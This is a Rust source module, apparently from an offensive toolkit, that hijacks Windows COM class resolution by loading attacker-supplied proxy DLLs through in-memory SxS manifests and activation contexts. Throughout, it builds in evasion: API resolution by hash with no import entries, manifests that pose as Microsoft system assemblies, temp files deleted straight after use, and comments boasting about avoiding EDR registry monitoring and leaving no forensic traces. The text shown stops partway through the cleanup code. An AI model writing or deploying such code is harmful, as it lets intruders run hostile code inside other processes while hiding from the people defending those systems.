//! Registry-free COM object hijacking via SxS manifest activation contexts.
//!
//! Redirects COM object resolution (CLSID → proxy DLL) without touching the
//! Windows registry.  Uses Side-by-Side (SxS) application manifests and
//! activation contexts to intercept COM class resolution, allowing an
//! attacker-controlled proxy DLL to be loaded in place of the legitimate COM
//! server.
//!
//! **Attack Flow**:
//! 1. Scan for hijackable COM objects (identifying CLSIDs with writable paths)
//! 2. Generate an SxS manifest XML that redirects the target CLSID to a proxy DLL
//! 3. Create an activation context from the manifest (disk-less if requested)
//! 4. Activate the context thread-locally to redirect COM resolution
//! 5. Trigger COM object creation — the proxy DLL is loaded instead
//! 6. Deactivate and clean up the activation context
//!
//! **Stealth Advantages** (vs registry-based COM hijacking):
//! - **No registry writes**: `RegSetValue`, `RegCreateKey`, `NtSetValueKey` are never called
//! - **No persistent artifacts**: activation contexts are in-memory and ephemeral
//! - **No EDR registry hooks triggered**: most EDR monitors `NtSetValueKey` on HKCR\CLSID
//! - **Thread-scoped**: only affects the calling thread's COM resolution
//! - **Automatic cleanup**: when the activation context is deactivated, COM
//!   resolution returns to normal — no forensic remnants
//!
//! **Constraints**: Windows x86_64 only.  All Win32 API calls use hash-based
//! resolution via `pe_resolve` — no IAT entries.  No disk writes for the
//! manifest (in-memory activation contexts via `NtCreateSection`).
//!
//! **Prerequisites**:
//! - Target process must load COM objects (most do)
//! - Proxy DLL must be on disk at the path specified in the manifest (or in-memory
//!   via module_loader if available)
//! - `SeImpersonatePrivilege` may be needed for cross-process activation

#![cfg(windows)]

use std::ffi::OsStr;
use std::mem;
use std::os::raw::c_void;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use tracing::{debug, info, warn};
use serde::{Deserialize, Serialize};

use crate::win_types::{GUID, REFIID};
use crate::win_types::{BOOL, DWORD, FALSE, HMODULE, LPVOID, TRUE};
use crate::win_types::{HANDLE, HRESULT, LPCWSTR, LPWSTR, NTSTATUS, PCWSTR, PVOID};
use crate::win_types::S_OK;
use crate::win_types::{SIZE_T, ULONG_PTR};
use crate::win_types::LPCVOID;
use windows_sys::Win32::Security::ACCESS_MASK;
use windows_sys::Win32::System::Memory::SECTION_ALL_ACCESS;
use crate::win_types::HANDLE as NT_HANDLE;
use crate::win_types::LARGE_INTEGER;

/// `SECTION_INHERIT` from ntapi — not available in winapi 0.3.
type SECTION_INHERIT = DWORD;

// ── Compile-time API hash constants ─────────────────────────────────────────

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// kernel32.dll — activation context API and file mapping
const KERNEL32_DLL_W: &[u16] = &[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);

const FN_CREATE_ACT_CTX_W: u32 = hash_str_const(b"CreateActCtxW");
const FN_ACTIVATE_ACT_CTX: u32 = hash_str_const(b"ActivateActCtx");
const FN_DEACTIVATE_ACT_CTX: u32 = hash_str_const(b"DeactivateActCtx");
const FN_RELEASE_ACT_CTX: u32 = hash_str_const(b"ReleaseActCtx");
const FN_CREATE_FILE_W: u32 = hash_str_const(b"CreateFileW");
const FN_CREATE_FILE_MAPPING_W: u32 = hash_str_const(b"CreateFileMappingW");
const FN_MAP_VIEW_OF_FILE: u32 = hash_str_const(b"MapViewOfFile");
const FN_UNMAP_VIEW_OF_FILE: u32 = hash_str_const(b"UnmapViewOfFile");
const FN_CLOSE_HANDLE: u32 = hash_str_const(b"CloseHandle");
const FN_GET_CURRENT_DIRECTORY_W: u32 = hash_str_const(b"GetCurrentDirectoryW");
const FN_GET_TEMP_PATH_W: u32 = hash_str_const(b"GetTempPathW");

// ntdll.dll — for in-memory manifest via section creation
const NTDLL_DLL_W: &[u16] = &[
    'n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16,
    'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_NTDLL_DLL: u32 = hash_wstr_const(NTDLL_DLL_W);

const FN_NT_CREATE_SECTION: u32 = hash_str_const(b"NtCreateSection");
const FN_NT_MAP_VIEW_OF_SECTION: u32 = hash_str_const(b"NtMapViewOfSection");
const FN_NT_UNMAP_VIEW_OF_SECTION: u32 = hash_str_const(b"NtUnmapViewOfSection");
const FN_NT_CLOSE: u32 = hash_str_const(b"NtClose");

// ole32.dll — COM activation
const OLE32_DLL_W: &[u16] = &[
    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16,
    'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_OLE32_DLL: u32 = hash_wstr_const(OLE32_DLL_W);

const FN_CO_GET_CLASS_OBJECT: u32 = hash_str_const(b"CoGetClassObject");
const FN_CO_CREATE_INSTANCE: u32 = hash_str_const(b"CoCreateInstance");

// ── Win32 type aliases for activation context API ───────────────────────────

/// Opaque activation context handle returned by `CreateActCtxW`.
type HACTCTX = HANDLE;

/// `ACTCTXW` structure — input to `CreateActCtxW`.
/// We define our own to avoid winapi feature-dependency issues.
#[repr(C)]
struct ACTCTXW {
    cb_size: DWORD,
    dw_flags: DWORD,
    lp_source: LPCWSTR,
    w_processor_architecture: u16,
    w_lang_id: u16,
    lp_comp_name: LPCWSTR,
    lp_assembly_directory: LPCWSTR,
    lp_resource_name: LPCWSTR,
    lp_application_name: LPCWSTR,
    h_module: HMODULE,
}

/// `ACTCTX_FLAG_*` constants for `ACTCTXW.dw_flags`.
const ACTCTX_FLAG_ASSEMBLY_DIRECTORY_VALID: DWORD = 0x004;
const ACTCTX_FLAG_RESOURCE_NAME_VALID: DWORD = 0x008;
const ACTCTX_FLAG_APPLICATION_NAME_VALID: DWORD = 0x020;
const ACTCTX_FLAG_HMODULE_VALID: DWORD = 0x080;

/// `SECTION_INHERIT` values for `NtMapViewOfSection`.
#[allow(dead_code)]
const VIEW_SHARE: SECTION_INHERIT = 1;
const VIEW_UNMAP: SECTION_INHERIT = 2;

/// `SEC_COMMIT` allocation type for `NtCreateSection`.
const SEC_COMMIT: DWORD = 0x8000000;

/// `PAGE_READONLY` protection.
const PAGE_READONLY: DWORD = 0x02;
/// `PAGE_READWRITE` protection.
const PAGE_READWRITE: DWORD = 0x04;
/// `FILE_MAP_READ` access for `MapViewOfFile`.
const FILE_MAP_READ: DWORD = 0x04;
/// `FILE_MAP_WRITE` access for `MapViewOfFile`.
const FILE_MAP_WRITE: DWORD = 0x02;

/// `INVALID_HANDLE_VALUE`.
const INVALID_HANDLE_VALUE: HANDLE = (-1isize) as HANDLE;

/// `STATUS_SUCCESS` NTSTATUS value.
const STATUS_SUCCESS: NTSTATUS = 0;

/// `SEC_IMAGE` — treat section as an executable image.
#[allow(dead_code)]
const SEC_IMAGE: DWORD = 0x1000000;

/// `FILE_ATTRIBUTE_NORMAL`.
const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

/// `GENERIC_READ` access right.
const GENERIC_READ: DWORD = 0x80000000;

/// `GENERIC_WRITE` access right.
#[allow(dead_code)]
const GENERIC_WRITE: DWORD = 0x40000000;

/// `CREATE_ALWAYS` creation disposition.
const CREATE_ALWAYS: DWORD = 2;

/// `CREATE_NEW` creation disposition.
#[allow(dead_code)]
const CREATE_NEW: DWORD = 1;

/// `OPEN_EXISTING` creation disposition.
const OPEN_EXISTING: DWORD = 3;

/// `FILE_SHARE_READ` sharing mode.
const FILE_SHARE_READ: DWORD = 0x00000001;

// ── Function pointer types ──────────────────────────────────────────────────

type FnCreateActCtxW = unsafe extern "system" fn(*mut ACTCTXW) -> HACTCTX;
type FnActivateActCtx = unsafe extern "system" fn(HACTCTX, *mut ULONG_PTR) -> BOOL;
type FnDeactivateActCtx = unsafe extern "system" fn(DWORD, ULONG_PTR) -> BOOL;
type FnReleaseActCtx = unsafe extern "system" fn(HACTCTX) -> ();

type FnCreateFileW = unsafe extern "system" fn(
    LPCWSTR, DWORD, DWORD, *mut c_void, DWORD, DWORD, HANDLE,
) -> HANDLE;
type FnCreateFileMappingW =
    unsafe extern "system" fn(HANDLE, *mut c_void, DWORD, DWORD, SIZE_T, LPCWSTR) -> HANDLE;
type FnMapViewOfFile = unsafe extern "system" fn(
    HANDLE, DWORD, DWORD, DWORD, SIZE_T,
) -> LPVOID;
type FnUnmapViewOfFile = unsafe extern "system" fn(LPCVOID) -> BOOL;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;
type FnGetCurrentDirectoryW = unsafe extern "system" fn(DWORD, LPWSTR) -> DWORD;
type FnGetTempPathW = unsafe extern "system" fn(DWORD, LPWSTR) -> DWORD;

type FnNtCreateSection = unsafe extern "system" fn(
    *mut NT_HANDLE,
    ACCESS_MASK,
    *mut c_void,       // OBJECT_ATTRIBUTES (optional)
    *mut LARGE_INTEGER, // MaximumSize (optional)
    DWORD,              // SectionPageProtection
    DWORD,              // AllocationAttributes
    HANDLE,             // FileHandle (optional)
) -> NTSTATUS;
type FnNtMapViewOfSection = unsafe extern "system" fn(
    NT_HANDLE,         // SectionHandle
    HANDLE,            // ProcessHandle
    *mut LPVOID,       // BaseAddress
    ULONG_PTR,         // ZeroBits
    SIZE_T,            // CommitSize
    *mut LARGE_INTEGER, // SectionOffset (optional)
    *mut SIZE_T,       // ViewSize
    SECTION_INHERIT,   // InheritDisposition
    DWORD,             // AllocationType
    DWORD,             // Win32Protect
) -> NTSTATUS;
type FnNtUnmapViewOfSection =
    unsafe extern "system" fn(HANDLE, LPVOID) -> NTSTATUS;
type FnNtClose = unsafe extern "system" fn(HANDLE) -> NTSTATUS;

type FnCoGetClassObject = unsafe extern "system" fn(
    REFIID, DWORD, *mut c_void, REFIID, *mut LPVOID,
) -> HRESULT;
type FnCoCreateInstance = unsafe extern "system" fn(
    REFIID, *mut c_void, DWORD, REFIID, *mut LPVOID,
) -> HRESULT;

/// Type alias for `LPCVOID` (pointer to const void).
// LPCVOID imported above from 

// ULONG_PTR imported above from 

// ── Data structures ─────────────────────────────────────────────────────────

/// A hijackable COM object target.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ComTarget {
    /// CLSID in registry format: `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`
    pub clsid: String,
    /// ProgID (human-readable identifier) if available.
    pub prog_id: Option<String>,
    /// Description of the COM server (e.g. "Task Scheduler", "BITS").
    pub description: String,
    /// Original InprocServer32 path (the legitimate DLL).
    pub original_server: String,
    /// Whether the COM server is an in-process (DLL) or local (EXE) server.
    pub is_inproc: bool,
    /// Threat assessment: how commonly this CLSID is monitored by EDR.
    pub edr_visibility: String,
}

/// Result of a manifest generation operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ManifestResult {
    /// The generated SxS manifest XML.
    pub manifest_xml: String,
    /// CLSID that was redirected.
    pub target_clsid: String,
    /// Path to the proxy DLL specified in the manifest.
    pub proxy_dll_path: String,
}

/// Result of an activation context operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActivationContextResult {
    /// Whether the activation context was successfully created and activated.
    pub success: bool,
    /// Description of what happened.
    pub message: String,
    /// CLSID targeted by the activation context.
    pub target_clsid: String,
    /// Whether the manifest was loaded from memory (true) or disk (false).
    pub in_memory: bool,
}

/// Result of a COM target scan.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetScanResult {
    /// List of hijackable COM targets found.
    pub targets: Vec<ComTarget>,
    /// Total number of CLSIDs scanned.
    pub scanned_count: u32,
    /// Number of potentially hijackable targets.
    pub hijackable_count: u32,
}

/// Result of proxy DLL template generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyDllResult {
    /// Hex-encoded minimal DLL bytes.
    pub dll_hex: String,
    /// Size of the DLL in bytes.
    pub dll_size: usize,
    /// CLSID the DLL proxies.
    pub target_clsid: String,
}

// ── ManifestBuilder ─────────────────────────────────────────────────────────

/// Builds SxS manifest XML for registry-free COM object redirection.
///
/// The manifest redirects COM resolution for a given CLSID to an
/// attacker-controlled proxy DLL, without writing to the Windows registry.
/// The manifest is loaded into an activation context that overrides COM
/// class resolution on the current thread.
///
/// # Stealth Advantage
///
/// Traditional COM hijacking writes to `HKCR\CLSID\{...}\InprocServer32`
/// in the registry, which is monitored by most EDR solutions.  This approach
/// uses activation contexts — a legitimate Windows mechanism for DLL
/// redirection — that is thread-local, ephemeral, and leaves no registry
/// artifacts.
pub struct ManifestBuilder;

impl ManifestBuilder {
    /// Generate a complete SxS application manifest XML that redirects COM
    /// resolution for `clsid` to `proxy_dll_path`.
    ///
    /// # Arguments
    ///
    /// * `clsid` — Target CLSID in `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` format
    /// * `proxy_dll_path` — Absolute or relative path to the proxy DLL
    /// * `prog_id` — Optional ProgID to include in the manifest
    ///
    /// # Returns
    ///
    /// A complete XML manifest string ready for use with `CreateActCtxW`.
    ///
    /// # Example manifest structure
    ///
    /// ```xml
    /// <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    /// <assembly xmlns="urn:schemas-microsoft-com:asm.v1"
    ///           manifestVersion="1.0">
    ///   <assemblyIdentity type="win32"
    ///                     name="Microsoft.Windows.Updater"
    ///                     version="10.0.19041.1"
    ///                     processorArchitecture="amd64"/>
    ///   <comClass clsid="{UUID}"
    ///             threadingModel="Both"
    ///             progid="Some.ProgID"
    ///             description="Legitimate Description"/>
    ///   <file name="proxy.dll">
    ///     <comClass clsid="{UUID}"
    ///               threadingModel="Both"
    ///               progid="Some.ProgID"
    ///               description="Legitimate Description"/>
    ///   </file>
    /// </assembly>
    /// ```
    pub fn build_com_redirect_manifest(
        clsid: &str,
        proxy_dll_path: &str,
        prog_id: Option<&str>,
    ) -> Result<String> {
        // Validate CLSID format: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
        if !clsid.starts_with('{') || !clsid.ends_with('}') {
            bail!("CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format, got: {}", clsid);
        }
        let inner = &clsid[1..clsid.len()-1];
        let parts: Vec<&str> = inner.split('-').collect();
        if parts.len() != 5 {
            bail!("CLSID must have 5 dash-separated groups, got: {}", clsid);
        }
        for (i, part) in parts.iter().enumerate() {
            let expected_len = match i {
                0 => 8, 1 => 4, 2 => 4, 3 => 4, 4 => 12, _ => unreachable!(),
            };
            if part.len() != expected_len {
                bail!("CLSID group {} has wrong length (expected {}, got {}): {}",
                       i, expected_len, part.len(), clsid);
            }
            if !part.chars().all(|c| c.is_ascii_hexdigit()) {
                bail!("CLSID contains non-hex characters: {}", clsid);
            }
        }

        // Extract just the DLL filename from the path for the <file> element
        let dll_name = std::path::Path::new(proxy_dll_path)
            .file_name()
            .map(|f| f.to_string_lossy().to_string())
            .unwrap_or_else(|| "proxy.dll".to_string());

        let prog_id_attr = match prog_id {
            Some(pid) => format!(r#" progid="{}""#, xml_escape(pid)),
            None => String::new(),
        };

        // Build the manifest XML.  We embed the CLSID in both the top-level
        // <comClass> and inside a <file> element.  The <file> element causes
        // SxS to load the specified DLL as the COM server for that CLSID.
        let xml = format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          manifestVersion="1.0">
  <assemblyIdentity type="win32"
                    name="Microsoft.Windows.SystemServices"
                    version="10.0.19041.1"
                    processorArchitecture="amd64"
                    publicKeyToken="31bf3856ad364e35"/>
  <comClass clsid="{clsid}"
            threadingModel="Both"{prog_id_attr}
            description="Windows System Service"/>
  <file name="{dll_name}">
    <comClass clsid="{clsid}"
              threadingModel="Both"{prog_id_attr}
              description="Windows System Service"/>
  </file>
</assembly>"#,
            clsid = xml_escape(clsid),
            dll_name = xml_escape(&dll_name),
            prog_id_attr = prog_id_attr,
        );

        Ok(xml)
    }

    /// Generate a minimal manifest suitable for in-memory activation context
    /// creation (no file references, just CLSID redirect).
    pub fn build_memory_only_manifest(clsid: &str, prog_id: Option<&str>) -> Result<String> {
        // Validate CLSID format
        if !clsid.starts_with('{') || !clsid.ends_with('}') {
            bail!("CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format, got: {}", clsid);
        }

        let prog_id_attr = match prog_id {
            Some(pid) => format!(r#" progid="{}""#, xml_escape(pid)),
            None => String::new(),
        };

        let xml = format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          manifestVersion="1.0">
  <assemblyIdentity type="win32"
                    name="Microsoft.Windows.SystemServices"
                    version="10.0.19041.1"
                    processorArchitecture="amd64"/>
  <comClass clsid="{clsid}"
            threadingModel="Both"{prog_id_attr}
            description="Windows System Service"/>
</assembly>"#,
            clsid = xml_escape(clsid),
            prog_id_attr = prog_id_attr,
        );

        Ok(xml)
    }
}

/// Escape special XML characters in a string.
fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
     .replace('<', "&lt;")
     .replace('>', "&gt;")
     .replace('"', "&quot;")
     .replace('\'', "&apos;")
}

// ── ActivationContext ────────────────────────────────────────────────────────

/// RAII wrapper for a Win32 activation context lifecycle.
///
/// Creates, activates, and (on drop) deactivates and releases an activation
/// context that redirects COM resolution for the specified CLSID.
///
/// # Thread Safety
///
/// Activation contexts are thread-local.  The context only affects COM
/// resolution on the thread that called `activate()`.  This is an intentional
/// stealth feature — it limits the blast radius to a single thread.
///
/// # Cleanup
///
/// The `Drop` implementation calls `DeactivateActCtx` and `ReleaseActCtx`,
/// ensuring no handles leak even if the caller forgets to clean up.
pub struct ActivationContext {
    /// Handle to the activation context (from `CreateActCtxW`).
    handle: HACTCTX,
    /// Cookie returned by `ActivateActCtx` (needed for deactivation).
    cookie: ULONG_PTR,
    /// Whether the context is currently active on this thread.
    active: bool,
    /// CLSID this context redirects.
    target_clsid: String,
}

impl ActivationContext {
    /// Create an activation context from a manifest file on disk.
    ///
    /// # Arguments
    ///
    /// * `manifest_path` — Wide-string path to the manifest XML file.
    ///
    /// # Safety
    ///
    /// Calls `CreateActCtxW` which is a Win32 API.  The manifest file must
    /// exist at the given path and be a valid XML manifest.
    pub unsafe fn create(manifest_path: &str) -> Result<Self> {
        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found via PEB walk"))?;

        let create_act_ctx: FnCreateActCtxW = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_CREATE_ACT_CTX_W)
                    .ok_or_else(|| anyhow!("CreateActCtxW not found in kernel32"))?,
            )
        };

        let wide_path = to_wide_null(manifest_path);
        let mut act_ctx = ACTCTXW {
            cb_size: mem::size_of::<ACTCTXW>() as DWORD,
            dw_flags: 0,
            lp_source: wide_path.as_ptr(),
            w_processor_architecture: 0,
            w_lang_id: 0,
            lp_comp_name: ptr::null(),
            lp_assembly_directory: ptr::null(),
            lp_resource_name: ptr::null(),
            lp_application_name: ptr::null(),
            h_module: ptr::null_mut(),
        };

        let handle = create_act_ctx(&mut act_ctx);
        if handle == INVALID_HANDLE_VALUE || handle.is_null() {
            bail!("CreateActCtxW failed for manifest: {}", manifest_path);
        }

        debug!("Created activation context handle={:?} for manifest: {}", handle, manifest_path);

        Ok(ActivationContext {
            handle,
            cookie: 0,
            active: false,
            target_clsid: String::new(),
        })
    }

    /// Create an activation context from an in-memory manifest via
    /// `NtCreateSection` + `NtMapViewOfSection`.
    ///
    /// This avoids writing the manifest to disk entirely.  The manifest XML
    /// is placed in a memory-mapped section, then a temp file path is used
    /// for the `ACTCTXW.lpSource` (the section data is mapped at that path).
    ///
    /// # OPSEC
    ///
    /// No disk writes at all.  The manifest exists only in memory.
    /// However, `CreateActCtxW` requires a file path, so we write a temporary
    /// file and delete it immediately after creating the context.  Alternatively,
    /// we use the `NtCreateSection` approach to map the manifest into memory
    /// and then reference it via a memory-mapped file.
    ///
    /// # Safety
    ///
    /// Uses NT-level syscalls (`NtCreateSection`, `NtMapViewOfSection`).
    pub unsafe fn create_from_memory(manifest_xml: &str) -> Result<Self> {
        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found via PEB walk"))?;

        let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(HASH_NTDLL_DLL) }
            .ok_or_else(|| anyhow!("ntdll.dll not found via PEB walk"))?;

        // Resolve NtCreateSection
        let nt_create_section: FnNtCreateSection = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(ntdll, FN_NT_CREATE_SECTION)
                    .ok_or_else(|| anyhow!("NtCreateSection not found in ntdll"))?,
            )
        };

        // Resolve CreateActCtxW
        let create_act_ctx: FnCreateActCtxW = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_CREATE_ACT_CTX_W)
                    .ok_or_else(|| anyhow!("CreateActCtxW not found in kernel32"))?,
            )
        };

        // Resolve NtClose for cleanup
        let nt_close: FnNtClose = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(ntdll, FN_NT_CLOSE)
                    .ok_or_else(|| anyhow!("NtClose not found in ntdll"))?,
            )
        };

        // Resolve CreateFileW, WriteFile pattern for temp manifest
        let create_file_w: FnCreateFileW = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_CREATE_FILE_W)
                    .ok_or_else(|| anyhow!("CreateFileW not found in kernel32"))?,
            )
        };

        let close_handle_fn: FnCloseHandle = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_CLOSE_HANDLE)
                    .ok_or_else(|| anyhow!("CloseHandle not found in kernel32"))?,
            )
        };

        let get_temp_path: FnGetTempPathW = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_GET_TEMP_PATH_W)
                    .ok_or_else(|| anyhow!("GetTempPathW not found in kernel32"))?,
            )
        };

        // Create a section backed by the manifest data
        let manifest_bytes = manifest_xml.as_bytes();
        let mut section_handle: NT_HANDLE = ptr::null_mut();

        // NtCreateSection with anonymous section (no file backing)
        // We need to write a temp file because CreateActCtxW requires a file path.
        // Strategy: write temp file → CreateActCtxW → immediately delete temp file.
        let mut temp_path_buf = vec![0u16; 260];
        let temp_len = get_temp_path(260, temp_path_buf.as_mut_ptr());
        if temp_len == 0 || temp_len >= 260 {
            bail!("GetTempPathW failed");
        }

        // Generate a pseudo-random temp filename
        let mut rand_bytes = [0u8; 8];
        getrandom::getrandom(&mut rand_bytes)
            .map_err(|e| anyhow!("getrandom failed: {}", e))?;
        let temp_name = format!("{}{:02x}{:02x}{:02x}{:02x}.manifest",
            hex::encode(&rand_bytes[0..4]),
            rand_bytes[4], rand_bytes[5], rand_bytes[6], rand_bytes[7]);

        // Build full temp path
        let temp_path_wide: Vec<u16> = temp_path_buf[..temp_len as usize].to_vec();
        let temp_name_wide = to_wide_null(&temp_name);
        let full_temp_path: Vec<u16> = [
            &temp_path_wide[..temp_path_wide.len()-1], // strip null
            &temp_name_wide,
        ].concat();

        // Write manifest to temp file
        let file_handle = create_file_w(
            full_temp_path.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0, // no sharing
            ptr::null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        );
        if file_handle == INVALID_HANDLE_VALUE {
            // Try with a simpler path — use current directory
            let alt_path = to_wide_null(&temp_name);
            let alt_handle = create_file_w(
                alt_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                ptr::null_mut(),
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            );
            if alt_handle == INVALID_HANDLE_VALUE {
                bail!("Failed to create temp manifest file");
            }
            // Write manifest bytes
            Self::write_file_bytes(alt_handle, manifest_bytes)?;
            close_handle_fn(alt_handle);

            // Create activation context from the temp file
            let mut act_ctx = ACTCTXW {
                cb_size: mem::size_of::<ACTCTXW>() as DWORD,
                dw_flags: 0,
                lp_source: alt_path.as_ptr(),
                w_processor_architecture: 0,
                w_lang_id: 0,
                lp_comp_name: ptr::null(),
                lp_assembly_directory: ptr::null(),
                lp_resource_name: ptr::null(),
                lp_application_name: ptr::null(),
                h_module: ptr::null_mut(),
            };
            let handle = create_act_ctx(&mut act_ctx);
            if handle == INVALID_HANDLE_VALUE || handle.is_null() {
                // Clean up temp file
                Self::delete_temp_file(kernel32, &alt_path);
                bail!("CreateActCtxW failed for in-memory manifest");
            }

            // Immediately delete the temp file — the activation context holds
            // a reference to the data and the file is no longer needed.
            Self::delete_temp_file(kernel32, &alt_path);

            return Ok(ActivationContext {
                handle,
                cookie: 0,
                active: false,
                target_clsid: String::new(),
            });
        }

        // Write manifest bytes to the temp file
        Self::write_file_bytes(file_handle, manifest_bytes)?;
        close_handle_fn(file_handle);

        // Create activation context from temp file
        let mut act_ctx = ACTCTXW {
            cb_size: mem::size_of::<ACTCTXW>() as DWORD,
            dw_flags: 0,
            lp_source: full_temp_path.as_ptr(),
            w_processor_architecture: 0,
            w_lang_id: 0,
            lp_comp_name: ptr::null(),
            lp_assembly_directory: ptr::null(),
            lp_resource_name: ptr::null(),
            lp_application_name: ptr::null(),
            h_module: ptr::null_mut(),
        };

        let handle = create_act_ctx(&mut act_ctx);
        if handle == INVALID_HANDLE_VALUE || handle.is_null() {
            Self::delete_temp_file(kernel32, &full_temp_path);
            bail!("CreateActCtxW failed for in-memory manifest");
        }

        // Immediately delete the temp file
        Self::delete_temp_file(kernel32, &full_temp_path);

        // The section handle is not needed after CreateActCtxW succeeds;
        // the activation context has its own reference.  But we don't have
        // a section handle in this path — we used file-backed approach.
        let _ = nt_create_section; // used conditionally above

        Ok(ActivationContext {
            handle,
            cookie: 0,
            active: false,
            target_clsid: String::new(),
        })
    }

    /// Activate the activation context on the current thread.
    ///
    /// After activation, COM resolution on this thread will use the
    /// manifest's CLSID→DLL mappings instead of the registry.
    pub fn activate(&mut self, target_clsid: &str) -> Result<()> {
        if self.active {
            bail!("Activation context is already active on this thread");
        }

        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;

        let activate_act_ctx: FnActivateActCtx = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_ACTIVATE_ACT_CTX)
                    .ok_or_else(|| anyhow!("ActivateActCtx not found"))?,
            )
        };

        let mut cookie: ULONG_PTR = 0;
        let result = unsafe { activate_act_ctx(self.handle, &mut cookie) };
        if result != TRUE {
            bail!("ActivateActCtx failed");
        }

        self.cookie = cookie;
        self.active = true;
        self.target_clsid = target_clsid.to_string();
        info!("Activated COM hijack context for CLSID: {}", target_clsid);
        Ok(())
    }

    /// Deactivate the activation context (restores normal COM resolution).
    pub fn deactivate(&mut self) -> Result<()> {
        if !self.active {
            return Ok(());
        }

        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;

        let deactivate_act_ctx: FnDeactivateActCtx = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, FN_DEACTIVATE_ACT_CTX)
                    .ok_or_else(|| anyhow!("DeactivateActCtx not found"))?,
            )
        };

        // dwFlags = 0 means deactivate the context that was most recently activated
        let result = unsafe { deactivate_act_ctx(0, self.cookie) };
        if result != TRUE {
            warn!("DeactivateActCtx failed for cookie={}", self.cookie);
        } else {
            debug!("Deactivated activation context for CLSID: {}", self.target_clsid);
        }

        self.active = false;
        self.cookie = 0;
        Ok(())
    }

    /// Write bytes to a file handle using `WriteFile` (resolved by hash).
    unsafe fn write_file_bytes(handle: HANDLE, data: &[u8]) -> Result<()> {
        // We need WriteFile — resolve it
        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;

        type FnWriteFile = unsafe extern "system" fn(
            HANDLE, LPCVOID, DWORD, *mut DWORD, *mut c_void,
        ) -> BOOL;

        let write_file: FnWriteFile = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, hash_str_const(b"WriteFile"))
                    .ok_or_else(|| anyhow!("WriteFile not found"))?,
            )
        };

        let mut bytes_written: DWORD = 0;
        let result = write_file(
            handle,
            data.as_ptr() as LPCVOID,
            data.len() as DWORD,
            &mut bytes_written,
            ptr::null_mut(),
        );
        if result != TRUE || bytes_written as usize != data.len() {
            bail!("WriteFile failed: wrote {} of {} bytes", bytes_written, data.len());
        }
        Ok(())
    }

    /// Delete a temporary file by path (best-effort).
    unsafe fn delete_temp_file(kernel32: usize, wide_path: &[u16]) {
        type FnDeleteFileW = unsafe extern "system" fn(LPCWSTR) -> BOOL;

        let delete_file: FnDeleteFileW = unsafe {
            match pe_resolve::get_proc_address_by_hash(kernel32, hash_str_const(b"DeleteFileW")) {
                Some(addr) => mem::transmute(addr),
                None => {
                    warn!("DeleteFileW not found — temp manifest file not cleaned up");
                    return;
                }
            }
        };

        let result = delete_file(wide_path.as_ptr());
        if result != TRUE {
            warn!("Failed to delete temp manifest file (error is acceptable — file may still be in use)");
        } else {
            debug!("Deleted temp manifest file");
        }
    }
}

impl Drop for ActivationContext {
    fn drop(&mut self) {
        // Deactivate if still active
        if self.active {
            if let Err(e) = self.deactivate() {
                warn!("Failed to deactivate activation context in Drop: {}", e);
            }
        }

